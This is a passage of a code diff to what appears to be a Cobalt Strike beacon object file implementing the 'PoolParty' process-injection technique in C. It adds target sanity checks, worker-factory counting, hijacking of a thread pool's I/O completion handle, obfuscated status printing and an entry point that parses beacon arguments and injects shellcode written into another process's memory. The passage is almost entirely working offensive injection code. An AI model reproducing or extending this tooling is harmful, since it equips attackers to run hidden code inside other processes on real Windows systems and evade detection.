+        SANITY_FAIL(kFmtWow64Query, kFmtSuggestPid);
+        InjectCleanup();
+        return FALSE;
+    }
+    if (arch == (PP_ARCH_UNKNOWN + 1)) {
+        SANITY_FAIL(kFmtArm64, kFmtSuggestPid);
+        InjectCleanup();
+        return FALSE;
+    }
+    if (arch == PP_ARCH_WOW64) {
+        SANITY_FAIL(kFmtWow64, kFmtSuggestPid);
         InjectCleanup();
         return FALSE;
     }
     return TRUE;
+}
+
+static BOOL VariantSanity(void) {
+#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
+    ULONG wfCount;
+#endif
+#ifdef PP_RESOLVE_POOL_IOCP
+    HANDLE hIocp;
+#endif
+
+    if (!SanityOpenTarget()) {
+        return FALSE;
+    }
+
+#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
+    wfCount = CountWorkerFactories(m_p_hTargetPid);
+    if (wfCount == 0) {
+        SANITY_FAIL(kFmtHijackFail, kFmtSuggestNoPool);
+        InjectCleanup();
+        return FALSE;
+    }
+    if (wfCount > 1) {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtMultiPool);
+    }
+#endif
+
+#ifdef PP_RESOLVE_POOL_IOCP
+    hIocp = HijackThreadPoolIoCompletion(m_p_hTargetPid);
+    if (hIocp == NULL) {
+        SANITY_FAIL(kFmtIocpType, kFmtSuggestLayout);
+        InjectCleanup();
+        return FALSE;
+    }
+    KERNEL32$CloseHandle(hIocp);
+#endif
+
+    if (!VariantSanityExtra()) {
+        InjectCleanup();
+        return FALSE;
+    }
+
+    OBF_PRINT0(CALLBACK_OUTPUT, kFmtSanityPass);
+    InjectCleanup();
+    return TRUE;
+}
+
+static void PoolPartyEntry(char *args, int len) {
+    ResetSharedState();
+    if (!ParseBeaconArgs(args, len)) {
+        return;
+    }
+    if (m_bSanityOnly) {
+        VariantSanity();
+        return;
+    }
+    Inject();
 }
 
 static BOOL InjectAllocWrite(void) {
@@ -1784,7 +2510,9 @@ static BOOL InjectAllocWrite(void) {
         InjectCleanup();
         return FALSE;
     }
-    KERNEL32$FlushInstructionCache(m_p_hTargetPid, m_ShellcodeAddress, (SIZE_T)m_szShellcodeSize);
+    if (!KERNEL32$FlushInstructionCache(m_p_hTargetPid, m_ShellcodeAddress, (SIZE_T)m_szShellcodeSize)) {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtFlushWarn);
+    }
     ApiPause();
     return TRUE;
 }
